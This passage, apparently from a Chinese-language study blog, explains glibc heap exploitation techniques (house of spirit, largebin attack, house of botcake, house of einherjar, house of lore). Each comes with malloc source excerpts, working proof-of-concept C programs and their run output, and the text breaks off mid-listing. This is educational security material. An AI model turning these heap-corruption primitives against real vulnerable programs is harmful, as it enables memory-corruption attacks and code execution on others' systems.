class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">10</span>];</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x40</span>;  <span class="comment">//size</span></span><br><span class="line">    fake_chunk[<span class="number">9</span>] = <span class="number">0x1145</span>;  <span class="comment">//绕过两个宽松的检查</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = (<span class="type">size_t</span> *)&amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">free</span>(victim);       <span class="comment">//将堆栈上的假堆块释放进入fastbin</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;   </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">//清空tcache保证下一次从fastbin中拿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x30</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim: %p\n&quot;</span>, victim); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    assert(target == victim);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_spirit.c -o house_of_spirit -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_spirit</span><br><span class="line">victim: 0x7ffe53fab090</span><br><span class="line">target: 0x7ffe53fab090</span><br></pre></td></tr></table></figure>
<h3 id="largebins">largebins</h3>
<h4 id="任意合法地址写堆块地址">任意合法地址写堆块地址</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101205326333.png"
alt="image-20241101205326333" />
<figcaption aria-hidden="true">image-20241101205326333</figcaption>
</figure>
<p>1.首先将<code>0x431</code> 释放进入<code>largebin</code></p>
<p>2.假设此时我们有一个<code>UAF</code>
,修改<code>0x431</code>从堆块的<code>bk_nextsize</code>指针指向目标地址</p>
<p>3.将释放<code>0x421</code>释放进入<code>largebin</code>,此时由于<code>0x421</code>是该<code>bin</code>中最小的,因此<code>0x421</code>放入<code>largebin</code>中不会有任何检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>其效果就是<code>target-&gt;fd_nextsize = &amp;chunk_0x421</code></p>
<p><code>0x431</code>的<code>fd_nextsize</code>还是错误地指向自己,这是因为修改该指针的<strong>机会</strong>被用于修改<code>target</code>的<code>fd_nextsize</code>了</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//use struct to align automatically</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> fd;</span><br><span class="line">    <span class="type">size_t</span> bk;</span><br><span class="line">    <span class="type">size_t</span> fd_nextsize;</span><br><span class="line">    <span class="type">size_t</span> bk_nextsize;</span><br><span class="line">&#125;Target;</span><br><span class="line"></span><br><span class="line">Target target=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = <span class="number">0</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span>,</span><br><span class="line">    .fd_nextsize = <span class="number">0</span>,</span><br><span class="line">    .bk_nextsize = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size: %p\n&quot;</span>, target.prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %p\n&quot;</span>, target.size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %p\n&quot;</span>, target.fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk: %p\n&quot;</span>, target.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %p\n&quot;</span>, target.fd_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %p\n&quot;</span>, target.bk_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *gap1;</span><br><span class="line">    <span class="type">size_t</span> *gap2;</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    gap1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    gap2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);        <span class="comment">//A first put into unsortedbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//a larger malloc request cause A then put into largebin</span></span><br><span class="line">    <span class="built_in">free</span>(B);        <span class="comment">//B first put into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    A[<span class="number">3</span>] = &amp;target;</span><br><span class="line">    print_target();</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//put B into the same largebin as A</span></span><br><span class="line">    print_target();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc largebin_attack.c -o largebin_attack -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./largebin_attack</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: (nil)</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: 0x55ea6d16f6e0</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure>
<p>同理可以将堆块地址写到堆栈上</p>
<h3 id="unsortedbin">unsortedbin</h3>
<h4 id="house_of_botcake">house_of_botcake</h4>
<p>当释放的堆块没有被<code>tcache</code>接受(通常因为<code>tcache</code>满了),也没有被<code>fastbin</code>接受(通常比<code>fastbin</code>管辖范围大),</p>
<p>此时尝试对堆块尝试<strong>向前合并向后合并</strong></p>
<p>如果向后临近<code>topchunk</code>则直接还给<code>topchunk</code></p>
<p>如果向后不临近<code>topchunk</code>,则会放到<code>unsortedbin</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>假设有两个堆块<code>a</code>和<code>b</code>在物理上相邻,<code>a</code>在低处,<code>b</code>在高处</p>
<p>先释放<code>b</code>进入<code>unsortedbin</code>,然后释放<code>a</code>,</p>
<p>此时<code>a</code>会向前合并到<code>b</code></p>
<p>此时让<code>tcachebin</code>腾个空,<code>Double Free a</code>,让<code>a</code>进入<code>tcachebins</code></p>
<blockquote>
<p>为什么要让<code>tcachebin</code>腾空呢?直接<code>free</code>放到<code>bins</code>中不行吗?</p>
<p>还真不行,因为第一次<code>free(a)</code>进入<code>unsortedbin</code>时,会让<code>a-&gt;nextchunk-&gt;prev_in_use</code>置零,</p>
<p>下一次如果<code>free(a)</code>还是进入<code>unsortedbin</code>中时,会检查到<code>a-&gt;nextchunk-&gt;prev_in_use=0</code>,检查出了二次释放</p>
<p>而<code>tcachebins</code>只会有一个<code>key</code>值判重检查,显然释放进入<code>bins</code>中的堆块不会设置<code>key</code>值,能够通过这个检查</p>
</blockquote>
<p>那么此时就形成了堆块重叠</p>
<p><code>a</code>成为<code>b</code>腹中的一部分</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//b&#x27;s address is higher than a&#x27;s</span></span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//prevent consolidation with topchunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//free b into unsortedbins</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//a will consolidate with b </span></span><br><span class="line">    tcache_chunks[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//make room for </span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">malloc</span>(b);</span><br><span class="line">    b[<span class="number">0</span>]=<span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_botcake.c -o house_of_botcake -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_botcake</span><br><span class="line">0x1122334455667788</span><br></pre></td></tr></table></figure>
<h4 id="house_of_einherjar">house_of_einherjar</h4>
<p>攻击假设:</p>
<p>0.能够控制<code>tcache</code>的状态</p>
<p>1.堆块申请时,复用下一堆块的<code>prev_size</code>字段,能够构造假的<code>prev_size</code>字段</p>
<p>并且存在<code>off-by-one</code>,能够再修改<code>size</code>的标志位中的<code>prev_in_use</code></p>
<p>画个图意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241104213606983.png"
alt="image-20241104213606983" />
<figcaption aria-hidden="true">image-20241104213606983</figcaption>
</figure>
<p><code>b</code>最终被释放进入<code>tcache</code>之后,可以使用<code>fake_chunk</code>改写<code>tcache</code>的元数据进行投毒</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *c;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_header;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_mem;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_chunk_header = a;          <span class="comment">//consruct a fake chunk inside chunk a&#x27;s memory</span></span><br><span class="line">    fake_chunk_header[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">1</span>] = <span class="number">0x130</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">2</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_header[<span class="number">3</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_mem = fake_chunk_header + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0x30</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = <span class="number">0x130</span>;         <span class="comment">//fake_c_prevsize</span></span><br><span class="line">    <span class="type">char</span> * size_ptr = &amp;b[<span class="number">0x38</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]; </span><br><span class="line">    *size_ptr= <span class="number">0</span>;     <span class="comment">//off by one</span></span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x220</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem: %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    assert(target == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_einherjar.c -o house_of_einherjar -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_einherjar</span><br><span class="line">target: 0x5591c4d6f9b0</span><br><span class="line">fake_chunk_mem: 0x5591c4d6f9b0</span><br></pre></td></tr></table></figure>
<h3 id="smallbins">smallbins</h3>
<h4 id="house_of_lore">house_of_lore</h4>
<p>攻击假设:对释放进入<code>smallbins</code>中的堆块有<code>UAF</code>,能够修改其<code>bk</code>指针</p>
<p>1.释放一个堆块<code>victim</code>进入<code>smallbins</code></p>
<p>2.对<code>victim</code>进行<code>UAF</code>,修改其<code>bk</code>指针指向<code>a</code>堆块</p>
<p>3.<code>a</code>前与<code>victim</code>相连,后与<code>b</code>相连</p>
<p>4.<code>b</code>后面只使用<code>bk</code>指针挂了一串堆块(能够填满<code>tcahe</code>)</p>
<p>5.清空<code>tcache</code>然后<code>malloc</code>,导致<code>a</code>,<code>b</code>以及一连串拖家带口进入<code>tcache</code></p>
<p>6.此后从<code>tcache</code>中分配可以进行任意地址写</p>
<p>画个图意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241105134342656.png"
alt="house_of_lore" />
<figcaption aria-hidden="true">house_of_lore</figcaption>
</figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 